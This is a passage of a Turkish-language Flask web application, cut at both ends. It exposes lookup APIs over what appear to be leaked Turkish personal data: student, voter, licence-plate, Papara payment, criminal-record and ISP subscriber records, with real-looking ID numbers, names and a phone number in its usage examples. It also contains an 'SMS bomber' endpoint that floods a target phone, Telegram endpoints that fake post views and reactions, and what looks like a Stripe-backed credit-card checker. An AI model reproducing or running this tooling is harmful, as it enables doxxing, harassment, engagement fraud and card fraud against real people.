            'message': 'Tepki gönderilemedi'
        }
        
    except Exception as e:
        return {'success': False, 'message': f'Hata: {str(e)}'}

def telegram_post_views(post_link, count=1):
    """
    Telegram postuna görüntülenme gönderir
    """
    results = []
    success_count = 0
    
    for i in range(count):
        try:
            result = telegram_post_interaction(post_link, 'view')
            if result.get('success'):
                success_count += 1
            results.append(result)
            time.sleep(0.5)  # Rate limiting
        except:
            results.append({'success': False, 'message': 'Hata'})
    
    return {
        'total': count,
        'success': success_count,
        'failed': count - success_count,
        'results': results
    }

# ==================== ANA SAYFA ====================

@app.route('/', methods=['GET'])
def ana_sayfa():
    return "@rinexdestek"

# ==================== E-OKUL API ====================

@app.route('/eokul', methods=['GET'])
def eokul_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'E-Okul Sorgulama API',
        'toplam_kayit': len(eokul_veriler),
        'kullanım': {
            'tc': '/eokul/api?tc=11060326504',
            'ad': '/eokul/api?ad=gazel',
            'soyad': '/eokul/api?soyad=atila'
        }
    })

@app.route('/eokul/api', methods=['GET'])
def eokul_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    
    if tc:
        if tc in eokul_dict:
            return jsonify(eokul_dict[tc])
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    if ad and soyad:
        sonuc = [k for k in eokul_veriler if ad.upper() in k['ad'].upper() and soyad.upper() in k['soyad'].upper()]
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    
    if ad:
        sonuc = [k for k in eokul_veriler if ad.upper() in k['ad'].upper()]
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    
    if soyad:
        sonuc = [k for k in eokul_veriler if soyad.upper() in k['soyad'].upper()]
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen tc, ad veya soyad girin'}), 400

# ==================== SEÇMEN API ====================

@app.route('/secmen', methods=['GET'])
def secmen_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Seçmen Sorgulama API',
        'toplam_kayit': len(secmen_veriler),
        'kullanım': {
            'tc': '/secmen/api?tc=18445070762',
            'ad': '/secmen/api?ad=ahmet',
            'soyad': '/secmen/api?soyad=aydoğdu',
            'il': '/secmen/api?il=adana'
        }
    })

@app.route('/secmen/api', methods=['GET'])
def secmen_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    il = request.args.get('il', '').strip()
    adres = request.args.get('adres', '').strip()
    
    if tc:
        if tc in secmen_dict:
            return jsonify(secmen_dict[tc])
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    sonuc = secmen_veriler
    
    if ad:
        sonuc = [k for k in sonuc if ad.upper() in k['ad'].upper()]
    if soyad:
        sonuc = [k for k in sonuc if soyad.upper() in k['soyad'].upper()]
    if il:
        sonuc = [k for k in sonuc if il.upper() in k['il'].upper()]
    if adres:
        sonuc = [k for k in sonuc if adres.upper() in k['adres'].upper()]
    
    if sonuc:
        return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
    return jsonify({'durum': 'hata', 'mesaj': 'Kayıt bulunamadı'}), 404

# ==================== PLAKA API ====================

@app.route('/plaka', methods=['GET'])
def plaka_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Plaka Sorgulama API - Plaka ↔ Ad-Soyad Dönüşümü',
        'toplam_kayit': len(plaka_veriler),
        'benzersiz_plaka': len(plaka_plaka_dict),
        'benzersiz_kisi': len(plaka_isim_dict),
        'kullanım': {
            'plaka_ile': '/plaka/api?plaka=41HU096 → Ad-Soyad',
            'isim_ile': '/plaka/api?ad_soyad=CEVDET ALKIŞ → Plaka'
        }
    })

@app.route('/plaka/api', methods=['GET'])
def plaka_sorgula():
    plaka = request.args.get('plaka', '').strip().upper()
    ad_soyad = request.args.get('ad_soyad', '').strip().upper()
    
    if plaka:
        if plaka in plaka_plaka_dict:
            return jsonify({
                'durum': 'başarılı',
                'plaka': plaka,
                'kisi_sayisi': len(plaka_plaka_dict[plaka]),
                'kisiler': plaka_plaka_dict[plaka]
            })
        return jsonify({'durum': 'hata', 'mesaj': f'{plaka} plakası bulunamadı'}), 404
    
    if ad_soyad:
        if ad_soyad in plaka_isim_dict:
            return jsonify({
                'durum': 'başarılı',
                'ad_soyad': ad_soyad,
                'plaka_sayisi': len(plaka_isim_dict[ad_soyad]),
                'plakalar': plaka_isim_dict[ad_soyad]
            })
        
        sonuc = []
        for isim, plakalar in plaka_isim_dict.items():
            if ad_soyad in isim.upper():
                sonuc.append({'ad_soyad': isim, 'plakalar': plakalar})
        
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad_soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Plaka veya ad_soyad girin'}), 400

# ==================== PAPARA API ====================

@app.route('/papara', methods=['GET'])
def papara_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Papara Sorgulama API - Papara ID ↔ Ad-Soyad Dönüşümü',
        'toplam_kayit': len(papara_veriler),
        'benzersiz_id': len(papara_id_dict),
        'benzersiz_kisi': len(papara_isim_dict),
        'kullanım': {
            'papara_id_ile': '/papara/api?papara_id=1354693996 → Ad-Soyad',
            'isim_ile': '/papara/api?ad_soyad=MEHMET TEKER → Papara ID'
        }
    })

@app.route('/papara/api', methods=['GET'])
def papara_sorgula():
    papara_id = request.args.get('papara_id', '').strip()
    ad_soyad = request.args.get('ad_soyad', '').strip().upper()
    
    if papara_id:
        if papara_id in papara_id_dict:
            return jsonify({
                'durum': 'başarılı',
                'papara_id': papara_id,
                'ad_soyad': papara_id_dict[papara_id]
            })
        return jsonify({'durum': 'hata', 'mesaj': f'{papara_id} Papara ID bulunamadı'}), 404
    
    if ad_soyad:
        if ad_soyad in papara_isim_dict:
            return jsonify({
                'durum': 'başarılı',
                'ad_soyad': ad_soyad,
                'papara_id_sayisi': len(papara_isim_dict[ad_soyad]),
                'papara_idler': papara_isim_dict[ad_soyad]
            })
        
        sonuc = []
        for isim, idler in papara_isim_dict.items():
            if ad_soyad in isim.upper():
                sonuc.append({'ad_soyad': isim, 'papara_idler': idler})
        
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad_soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Papara ID veya ad_soyad girin'}), 400

# ==================== SİCİL API ====================

@app.route('/sicil', methods=['GET'])
def sicil_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Sicil Sorgulama API',
        'toplam_kayit': len(sicil_veriler),
        'benzersiz_tc': len(sicil_tc_dict),
        'benzersiz_ad_soyad': len(sicil_ad_soyad_dict),
        'kullanım': {
            'tc': '/sicil/api?tc=19402658634',
            'ad': '/sicil/api?ad=BERKAY',
            'soyad': '/sicil/api?soyad=GENÇTÜRK'
        }
    })

@app.route('/sicil/api', methods=['GET'])
def sicil_sorgula():
    tc = request.args.get('tc', '').strip()
    ad = request.args.get('ad', '').strip()
    soyad = request.args.get('soyad', '').strip()
    
    if tc:
        tc_temiz = re.sub(r'\s', '', tc)
        for key in sicil_tc_dict:
            key_temiz = re.sub(r'\s', '', key)
            if tc_temiz == key_temiz:
                return jsonify(sicil_tc_dict[key])
        return jsonify({'durum': 'hata', 'mesaj': f'{tc} TC bulunamadı'}), 404
    
    if ad and soyad:
        ad_soyad = f"{ad} {soyad}".strip().upper()
        sonuc = []
        for anahtar, kayitlar in sicil_ad_soyad_dict.items():
            if ad_soyad in anahtar.upper():
                sonuc.extend(kayitlar)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} {soyad} bulunamadı'}), 404
    
    if ad:
        sonuc = []
        for anahtar, kayitlar in sicil_ad_soyad_dict.items():
            if ad.upper() in anahtar.upper():
                sonuc.extend(kayitlar)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} bulunamadı'}), 404
    
    if soyad:
        sonuc = []
        for anahtar, kayitlar in sicil_ad_soyad_dict.items():
            if soyad.upper() in anahtar.upper():
                sonuc.extend(kayitlar)
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{soyad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen tc, ad veya soyad girin'}), 400

# ==================== TURKNET API ====================

@app.route('/turknet', methods=['GET'])
def turknet_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'TurkNet Sorgulama API',
        'toplam_kayit': len(turknet_veriler),
        'benzersiz_ad': len(turknet_ad_dict),
        'benzersiz_telefon': len(turknet_phone_dict),
        'kullanım': {
            'ad': '/turknet/api?ad=Egemen Kutay',
            'telefon': '/turknet/api?telefon=05539848500'
        }
    })

@app.route('/turknet/api', methods=['GET'])
def turknet_sorgula():
    ad = request.args.get('ad', '').strip()
    telefon = request.args.get('telefon', '').strip()
    
    if telefon:
        telefon_temiz = re.sub(r'\s', '', telefon)
        telefon_temiz = re.sub(r'\D', '', telefon_temiz)
        
        for tel, kisi in turknet_phone_dict.items():
            tel_temiz = re.sub(r'\s', '', tel)
            tel_temiz = re.sub(r'\D', '', tel_temiz)
            if telefon_temiz == tel_temiz:
                return jsonify(kisi)
        
        sonuc = []
        for kisi in turknet_veriler:
            if kisi['telefon']:
                tel_temiz = re.sub(r'\s', '', kisi['telefon'])
                tel_temiz = re.sub(r'\D', '', tel_temiz)
                if telefon_temiz in tel_temiz or tel_temiz in telefon_temiz:
                    sonuc.append(kisi)
        
        if sonuc:
            return jsonify({'durum': 'başarılı', 'bulunan': len(sonuc), 'sonuc': sonuc})
        return jsonify({'durum': 'hata', 'mesaj': f'{telefon} bulunamadı'}), 404
    
    if ad:
        ad_upper = ad.upper()
        
        for name in turknet_ad_dict:
            if ad_upper == name.upper():
                return jsonify({'durum': 'başarılı', 'bulunan': len(turknet_ad_dict[name]), 'sonuc': turknet_ad_dict[name]})
        
        sonuc = []
        for name, kayitlar in turknet_ad_dict.items():
            if ad_upper in name.upper() or name.upper() in ad_upper:
                sonuc.extend(kayitlar)
        
        if not sonuc:
            for kisi in turknet_veriler:
                if kisi['adres'] and ad_upper in kisi['adres'].upper():
                    sonuc.append(kisi)
        
        if sonuc:
            benzersiz = []
            seen = set()
            for item in sonuc:
                key = f"{item.get('ad', '')}_{item.get('telefon', '')}"
                if key not in seen:
                    seen.add(key)
                    benzersiz.append(item)
            return jsonify({'durum': 'başarılı', 'bulunan': len(benzersiz), 'sonuc': benzersiz})
        return jsonify({'durum': 'hata', 'mesaj': f'{ad} bulunamadı'}), 404
    
    return jsonify({'durum': 'hata', 'mesaj': 'Lütfen ad veya telefon girin'}), 400

# ==================== SMS BOMBER API ====================

@app.route('/smsbomber', methods=['GET'])
def smsbomber_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'SMS Bomber API',
        'aciklama': 'Telefon numarasına SMS bombası gönderir',
        'kullanım': {
            'bombala': '/smsbomber/bombala?telefon=5551234567',
            'durum': '/smsbomber/durum?telefon=5551234567'
        },
        'not': 'Telefon numarası 0 olmadan, sadece rakam olarak girilir (örn: 5551234567)'
    })

@app.route('/smsbomber/bombala', methods=['GET'])
def smsbomber_bombala():
    telefon = request.args.get('telefon', '').strip()
    
    if not telefon:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telefon numarası giriniz (0 olmadan, örn: 5551234567)',
            'ornek': '/smsbomber/bombala?telefon=5551234567'
        }), 400
    
    telefon = re.sub(r'\D', '', telefon)
    if len(telefon) < 10:
        return jsonify({'durum': 'hata', 'mesaj': 'Geçerli bir telefon numarası giriniz'}), 400
    
    if telefon.startswith('0'):
        telefon = telefon[1:]
    
    if telefon in sms_threads and sms_threads[telefon].is_alive():
        return jsonify({
            'durum': 'uyarı',
            'mesaj': 'Bu numara zaten bombalanıyor!',
            'telefon': telefon,
            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
        })
    
    try:
        def bomba_gonder():
            sms = SendSms(telefon)
            sonuc = sms.run_all()
            sms_results[telefon] = {
                'tarih': datetime.now().isoformat(),
                'telefon': telefon,
                'toplam_servis': sonuc['total'],
                'basari': sonuc['success'],
                'basarisiz': sonuc['failed'],
                'detay': sonuc['results']
            }
        
        thread = threading.Thread(target=bomba_gonder)
        thread.daemon = True
        thread.start()
        sms_threads[telefon] = thread
        
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'SMS bombası başlatıldı!',
            'telefon': telefon,
            'durum_kontrol': f'/smsbomber/durum?telefon={telefon}'
        })
    except Exception as e:
        return jsonify({'durum': 'hata', 'mesaj': f'Başlatma hatası: {str(e)}'}), 500

@app.route('/smsbomber/durum', methods=['GET'])
def smsbomber_durum():
    telefon = request.args.get('telefon', '').strip()
    
    if not telefon:
        return jsonify({'durum': 'hata', 'mesaj': 'Telefon numarası giriniz'}), 400
    
    telefon = re.sub(r'\D', '', telefon)
    if telefon.startswith('0'):
        telefon = telefon[1:]
    
    if telefon in sms_results:
        return jsonify({
            'durum': 'başarılı',
            'telefon': telefon,
            'sonuc': sms_results[telefon]
        })
    elif telefon in sms_threads and sms_threads[telefon].is_alive():
        return jsonify({
            'durum': 'devam_ediyor',
            'mesaj': 'SMS bombası devam ediyor...',
            'telefon': telefon
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Bu numara için bomba kaydı bulunamadı',
            'telefon': telefon
        }), 404

@app.route('/smsbomber/liste', methods=['GET'])
def smsbomber_liste():
    return jsonify({
        'durum': 'başarılı',
        'toplam': len(sms_results),
        'sonuclar': sms_results
    })

# ==================== TELEGRAM GERÇEK API ====================

@app.route('/telegram', methods=['GET'])
def telegram_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Telegram API - Gerçek Telegram API İşlemleri',
        'aciklama': 'Telegram bot token ile gerçek API işlemleri',
        'kullanım': {
            'bot_bilgi': '/telegram/bot?token=BOT_TOKEN',
            'kullanici_bilgi': '/telegram/user?username=@kullanici_adi',
            'post_etkilesim': '/telegram/post?link=https://t.me/username/123&action=view',
            'post_begeni': '/telegram/react?link=https://t.me/username/123&reaction=👍',
            'post_goruntulenme': '/telegram/views?link=https://t.me/username/123&count=5',
            'bot_guncellemeler': '/telegram/updates?token=BOT_TOKEN',
            'mesaj_gonder': '/telegram/send?token=BOT_TOKEN&chat_id=CHAT_ID&text=MESAJ',
            'chat_bilgi': '/telegram/chat?token=BOT_TOKEN&chat_id=CHAT_ID',
            'uye_sayisi': '/telegram/members?token=BOT_TOKEN&chat_id=CHAT_ID',
            'davet_linki': '/telegram/invite?token=BOT_TOKEN&chat_id=CHAT_ID',
            'foto_gonder': '/telegram/photo?token=BOT_TOKEN&chat_id=CHAT_ID&url=FOTO_URL',
            'webhook_ayarla': '/telegram/webhook?token=BOT_TOKEN&url=WEBHOOK_URL',
            'webhook_sil': '/telegram/webhook/delete?token=BOT_TOKEN',
            'webhook_bilgi': '/telegram/webhook/info?token=BOT_TOKEN'
        }
    })

@app.route('/telegram/bot', methods=['GET'])
def telegram_bot_info_api():
    """Bot bilgilerini alır - GERÇEK API"""
    token = request.args.get('token', '').strip()
    
    if not token:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Bot token giriniz',
            'ornek': '/telegram/bot?token=123456:ABC-DEF1234ghIkl'
        }), 400
    
    if ':' not in token:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Geçersiz token formatı. Token "BOT_ID:TOKEN" formatında olmalıdır.'
        }), 400
    
    sonuc = telegram_bot_info(token)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'bot_id': sonuc['bot_id'],
            'bot_username': sonuc['bot_username'],
            'bot_name': sonuc['bot_name'],
            'is_bot': sonuc['is_bot'],
            'can_join_groups': sonuc.get('can_join_groups', False),
            'can_read_all_group_messages': sonuc.get('can_read_all_group_messages', False),
            'supports_inline_queries': sonuc.get('supports_inline_queries', False),
            'token': token[:10] + '...' + token[-5:]
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Bot bilgileri alınamadı')
        }), 400

@app.route('/telegram/user', methods=['GET'])
def telegram_user_info_api():
    """@username'den kullanıcı bilgilerini alır - GERÇEK API"""
    username = request.args.get('username', '').strip()
    
    if not username:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Kullanıcı adı giriniz (örn: @username)',
            'ornek': '/telegram/user?username=@username'
        }), 400
    
    sonuc = telegram_user_info(username)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'kullanici': {
                'username': sonuc.get('username'),
                'first_name': sonuc.get('first_name'),
                'last_name': sonuc.get('last_name'),
                'user_id': sonuc.get('user_id'),
                'type': sonuc.get('type'),
                'bio': sonuc.get('bio', ''),
                'description': sonuc.get('description', ''),
                'invite_link': sonuc.get('invite_link', ''),
                'member_count': sonuc.get('member_count', 0)
            }
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Kullanıcı bilgileri alınamadı')
        }), 400

@app.route('/telegram/post', methods=['GET'])
def telegram_post_interaction_api():
    """Telegram postuna etkileşim gönderir - GERÇEK API"""
    link = request.args.get('link', '').strip()
    action = request.args.get('action', 'view').strip()
    
    if not link:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telegram mesaj linki giriniz',
            'ornek': '/telegram/post?link=https://t.me/username/123'
        }), 400
    
    sonuc = telegram_post_interaction(link, action)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'mesaj': sonuc.get('message'),
            'chat_id': sonuc.get('chat_id'),
            'message_id': sonuc.get('message_id'),
            'action': sonuc.get('action'),
            'link': sonuc.get('link')
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Etkileşim gönderilemedi')
        }), 400

@app.route('/telegram/react', methods=['GET'])
def telegram_react_api():
    """Telegram postuna tepki gönderir - GERÇEK API"""
    link = request.args.get('link', '').strip()
    reaction = request.args.get('reaction', '👍').strip()
    
    if not link:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telegram mesaj linki giriniz',
            'ornek': '/telegram/react?link=https://t.me/username/123&reaction=👍'
        }), 400
    
    sonuc = telegram_post_react(link, reaction)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'mesaj': sonuc.get('message'),
            'chat_id': sonuc.get('chat_id'),
            'message_id': sonuc.get('message_id'),
            'reaction': sonuc.get('reaction'),
            'link': link
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Tepki gönderilemedi')
        }), 400

@app.route('/telegram/views', methods=['GET'])
def telegram_views_api():
    """Telegram postuna görüntülenme gönderir - GERÇEK API"""
    link = request.args.get('link', '').strip()
    count = request.args.get('count', '1').strip()
    
    if not link:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Telegram mesaj linki giriniz',
            'ornek': '/telegram/views?link=https://t.me/username/123&count=5'
        }), 400
    
    try:
        count_int = int(count)
        if count_int < 1:
            count_int = 1
        if count_int > 20:
            count_int = 20
    except:
        count_int = 1
    
    sonuc = telegram_post_views(link, count_int)
    
    return jsonify({
        'durum': 'başarılı',
        'toplam': sonuc['total'],
        'basari': sonuc['success'],
        'basarisiz': sonuc['failed'],
        'link': link,
        'detay': sonuc['results']
    })

@app.route('/telegram/updates', methods=['GET'])
def telegram_updates_api():
    """Bot güncellemelerini alır - GERÇEK API"""
    token = request.args.get('token', '').strip()
    offset = request.args.get('offset', '').strip()
    
    if not token:
        return jsonify({'durum': 'hata', 'mesaj': 'Bot token giriniz'}), 400
    
    offset_int = int(offset) if offset else None
    sonuc = telegram_bot_get_updates(token, offset_int)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'update_sayisi': len(sonuc['updates']),
            'updates': sonuc['updates']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Güncellemeler alınamadı')
        }), 400

@app.route('/telegram/send', methods=['GET', 'POST'])
def telegram_send_api():
    """Mesaj gönderir - GERÇEK API"""
    token = request.args.get('token', '').strip()
    chat_id = request.args.get('chat_id', '').strip()
    text = request.args.get('text', '').strip()
    
    if request.method == 'POST':
        data = request.get_json() or {}
        token = data.get('token', token)
        chat_id = data.get('chat_id', chat_id)
        text = data.get('text', text)
    
    if not token or not chat_id or not text:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Token, chat_id ve text gerekli'
        }), 400
    
    sonuc = telegram_bot_send_message(token, chat_id, text)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'Mesaj gönderildi',
            'result': sonuc.get('result')
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Mesaj gönderilemedi')
        }), 400

@app.route('/telegram/chat', methods=['GET'])
def telegram_chat_api():
    """Chat bilgilerini alır - GERÇEK API"""
    token = request.args.get('token', '').strip()
    chat_id = request.args.get('chat_id', '').strip()
    
    if not token or not chat_id:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Token ve chat_id gerekli'
        }), 400
    
    sonuc = telegram_bot_get_chat_info(token, chat_id)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'chat': sonuc['chat']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Chat bilgileri alınamadı')
        }), 400

@app.route('/telegram/members', methods=['GET'])
def telegram_members_api():
    """Chat üye sayısını alır - GERÇEK API"""
    token = request.args.get('token', '').strip()
    chat_id = request.args.get('chat_id', '').strip()
    
    if not token or not chat_id:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Token ve chat_id gerekli'
        }), 400
    
    sonuc = telegram_bot_get_chat_members_count(token, chat_id)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'uye_sayisi': sonuc['count']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Üye sayısı alınamadı')
        }), 400

@app.route('/telegram/invite', methods=['GET'])
def telegram_invite_api():
    """Chat davet linkini alır - GERÇEK API"""
    token = request.args.get('token', '').strip()
    chat_id = request.args.get('chat_id', '').strip()
    
    if not token or not chat_id:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Token ve chat_id gerekli'
        }), 400
    
    sonuc = telegram_bot_export_chat_invite_link(token, chat_id)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'davet_linki': sonuc['invite_link']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Davet linki alınamadı')
        }), 400

@app.route('/telegram/photo', methods=['GET', 'POST'])
def telegram_photo_api():
    """Fotoğraf gönderir - GERÇEK API"""
    token = request.args.get('token', '').strip()
    chat_id = request.args.get('chat_id', '').strip()
    photo_url = request.args.get('url', '').strip()
    caption = request.args.get('caption', '').strip()
    
    if request.method == 'POST':
        data = request.get_json() or {}
        token = data.get('token', token)
        chat_id = data.get('chat_id', chat_id)
        photo_url = data.get('url', photo_url)
        caption = data.get('caption', caption)
    
    if not token or not chat_id or not photo_url:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Token, chat_id ve url gerekli'
        }), 400
    
    sonuc = telegram_bot_send_photo(token, chat_id, photo_url, caption)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'mesaj': 'Fotoğraf gönderildi',
            'result': sonuc.get('result')
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Fotoğraf gönderilemedi')
        }), 400

@app.route('/telegram/leave', methods=['GET'])
def telegram_leave_api():
    """Chatten ayrılır - GERÇEK API"""
    token = request.args.get('token', '').strip()
    chat_id = request.args.get('chat_id', '').strip()
    
    if not token or not chat_id:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Token ve chat_id gerekli'
        }), 400
    
    sonuc = telegram_bot_leave_chat(token, chat_id)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'mesaj': sonuc['message']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Chatten ayrılamadı')
        }), 400

@app.route('/telegram/webhook', methods=['GET', 'POST'])
def telegram_webhook_set_api():
    """Webhook ayarlar - GERÇEK API"""
    token = request.args.get('token', '').strip()
    webhook_url = request.args.get('url', '').strip()
    
    if request.method == 'POST':
        data = request.get_json() or {}
        token = data.get('token', token)
        webhook_url = data.get('url', webhook_url)
    
    if not token:
        return jsonify({'durum': 'hata', 'mesaj': 'Token gerekli'}), 400
    
    if not webhook_url:
        return jsonify({'durum': 'hata', 'mesaj': 'Webhook URL gerekli'}), 400
    
    sonuc = telegram_bot_set_webhook(token, webhook_url)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'mesaj': sonuc['message']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Webhook ayarlanamadı')
        }), 400

@app.route('/telegram/webhook/delete', methods=['GET', 'POST'])
def telegram_webhook_delete_api():
    """Webhook siler - GERÇEK API"""
    token = request.args.get('token', '').strip()
    
    if request.method == 'POST':
        data = request.get_json() or {}
        token = data.get('token', token)
    
    if not token:
        return jsonify({'durum': 'hata', 'mesaj': 'Token gerekli'}), 400
    
    sonuc = telegram_bot_delete_webhook(token)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'mesaj': sonuc['message']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Webhook silinemedi')
        }), 400

@app.route('/telegram/webhook/info', methods=['GET'])
def telegram_webhook_info_api():
    """Webhook bilgilerini alır - GERÇEK API"""
    token = request.args.get('token', '').strip()
    
    if not token:
        return jsonify({'durum': 'hata', 'mesaj': 'Token gerekli'}), 400
    
    sonuc = telegram_bot_get_webhook_info(token)
    
    if sonuc.get('success'):
        return jsonify({
            'durum': 'başarılı',
            'webhook_bilgi': sonuc['webhook_info']
        })
    else:
        return jsonify({
            'durum': 'hata',
            'mesaj': sonuc.get('message', 'Webhook bilgileri alınamadı')
        }), 400

@app.route('/telegram/bot-find', methods=['GET'])
def telegram_bot_find_api():
    """Bot username'inden bilgi almaya çalışır"""
    username = request.args.get('username', '').strip()
    
    if not username:
        return jsonify({
            'durum': 'hata',
            'mesaj': 'Bot username giriniz (örn: @mybot)',
            'ornek': '/telegram/bot-find?username=@mybot'
        }), 400
    
    if username.startswith('@'):
        username = username[1:]
    
    return jsonify({
        'durum': 'bilgi',
        'mesaj': 'Bot token\'ları public değildir. Token almak için @BotFather ile konuşun.',
        'username': username,
        'nasil_alirim': '1. Telegram\'da @BotFather\'ı bulun\n2. /newbot komutunu gönderin\n3. Bot adını ve username\'ini girin\n4. Token\'ınızı alın',
        'token_ile_yapilacaklar': [
            'Bot bilgilerini al: /telegram/bot?token=BOT_TOKEN',
            'Mesaj gönder: /telegram/send?token=BOT_TOKEN&chat_id=CHAT_ID&text=MESAJ',
            'Chat bilgisi: /telegram/chat?token=BOT_TOKEN&chat_id=CHAT_ID',
            'Üye sayısı: /telegram/members?token=BOT_TOKEN&chat_id=CHAT_ID',
            'Davet linki: /telegram/invite?token=BOT_TOKEN&chat_id=CHAT_ID'
        ]
    })

# ==================== CC DOĞRULAMA API ====================

@app.route('/cc', methods=['GET'])
def cc_ana():
    return jsonify({
        'durum': 'başarılı',
        'api': 'Kredi Kartı Doğrulama API',
        'stripe_aktif': bool(STRIPE_SECRET_KEY),
        'kullanım': {
            'luhn': '/cc/luhn?kart=4111111111111111',
            'format_kontrol': '/cc/bilgi (POST)',
            'tam_dogrula': '/cc/dogrula (POST)'
        }
    })

@app.route('/cc/luhn', methods=['GET', 'POST'])
def luhn_kontrol_api():
    if request.method == 'GET':
        kart_no = request.args.get('kart', '').strip()
    else:
        data = request.get_json() or {}
        kart_no = data.get('kart_no', '').strip()
    
    kart_no = re.sub(r'\D', '', kart_no)
    if not kart_no:
        return jsonify({'durum': 'hata', 'mesaj': 'Kart numarası girin'}), 400
    
    return jsonify({
        'durum': 'başarılı',
        'kart_no': kart_no,
        'gecerli': luhn_kontrol(kart_no)
    })

@app.route('/cc/bilgi', methods=['POST'])
def kart_bilgi_kontrol():
    data = request.get_json()
    if not data:
        return jsonify({'durum': 'hata', 'mesaj': 'JSON verisi gönderin'}), 400
    
    kart_no = data.get('kart_no', '').strip()
    ay = data.get('ay', '').strip()
    yil = data.get('yil', '').strip()
    cvv = data.get('cvv', '').strip()
    
    if not all([kart_no, ay, yil, cvv]):
        return jsonify({'durum': 'hata', 'mesaj': 'Tüm alanlar zorunlu'}), 400
    
    kart_no = re.sub(r'\D', '', kart_no)
    hatalar = kart_bilgilerini_kontrol(kart_no, ay, yil, cvv)
    
    if hatalar:
        return jsonify({'durum': 'hata', 'hatalar': hatalar}), 400
    
    return jsonify({
        'durum': 'başarılı',
        'mesaj': 'Format geçerli',
        'kart_no': kart_no[-4:]
    })

@app.route('/cc/dogrula', methods=['POST'])
def cc_dogrula():
    data = request.get_json()
    if not data:
